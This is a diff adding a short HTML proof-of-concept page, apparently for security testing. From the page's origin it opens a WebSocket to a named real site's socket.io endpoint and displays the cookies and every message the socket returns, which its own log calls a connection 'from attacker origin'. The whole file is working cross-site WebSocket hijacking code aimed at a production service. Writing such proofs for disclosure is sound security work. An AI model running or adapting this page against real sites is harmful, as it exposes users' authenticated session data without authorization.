@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head><title>ws-hijack-test</title></head>
+<body>
+<h1>ws-hijack-test</h1>
+<script>
+(function() {
+  var out = document.createElement('pre');
+  out.style.fontSize = '18px';
+  document.body.appendChild(out);
+  function log(s) { out.textContent += s + "\n"; alert(s); }
+
+  log("origin: " + window.location.href);
+  log("cookies visible to this page: " + document.cookie);
+
+  try {
+    var ws = new WebSocket("wss://1win.com/v4/socket.io/?isMobileApp=true&xorigin=1win.com&app=frontend&Language=en&EIO=4&transport=websocket");
+    ws.onopen = function() { log("WS OPEN to 1win.com from attacker origin"); };
+    ws.onmessage = function(e) {
+      var d = String(e.data);
+      log("WS MSG (" + d.length + " bytes): " + d.substring(0, 500));
+    };
+    ws.onerror = function(e) { log("WS ERROR"); };
+    ws.onclose = function(e) { log("WS CLOSED code=" + e.code + " reason=" + e.reason); };
+  } catch (e) {
+    log("WS EXCEPTION: " + e);
+  }
+})();
+</script>
+</body>
+</html>
